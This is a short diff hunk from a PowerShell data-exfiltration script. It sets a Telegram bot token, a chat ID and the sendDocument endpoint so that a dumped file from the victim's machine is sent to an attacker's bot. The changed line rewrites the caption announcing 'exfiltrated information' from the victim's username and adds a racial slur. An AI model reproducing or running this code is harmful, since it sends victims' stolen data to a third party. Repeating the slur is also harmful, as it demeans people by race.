@@ -47,7 +47,7 @@ while (!(Test-Path "$dumpFile")) {
 $token = "7743326373:AAFJ-w9ReJ11Bv1SRcU3a09_V9_FN1rmzzg"
 $chatID = "8059825653"
 $uri = "https://api.telegram.org/bot$token/sendDocument"
-$caption = "Here are exfiltrated informations from $env:USERNAME"
+$caption = "Here are the exfiltrated information my nigga from $env:USERNAME"
 
 # Check if the file exists before sending
 if (!(Test-Path $dumpFile)) {
